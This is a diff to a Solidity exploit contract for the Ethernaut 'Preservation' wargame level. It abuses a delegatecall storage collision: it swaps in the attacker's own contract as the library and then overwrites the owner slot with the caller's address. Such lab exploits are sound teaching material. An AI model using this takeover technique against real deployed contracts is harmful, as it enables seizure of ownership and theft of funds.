@@ -8,12 +8,13 @@ contract Attack16 {
     address public timeZone2Library;
     address public owner;
 
-    function attack(Preservation preservation) public {
+    // preservation = ETHERNAUT_INSTANCE
+    function attack(Preservation preservation) external {
         preservation.setFirstTime(uint256(uint160(address(this))));
-        preservation.setFirstTime(1111);
+        preservation.setFirstTime(uint256(uint160(msg.sender)));
     }
 
-    function setTime(uint256 _time) public {
-        owner = msg.sender;
+    function setTime(uint256 _owner) external {
+        owner = address(uint160(_owner));
     }
 }
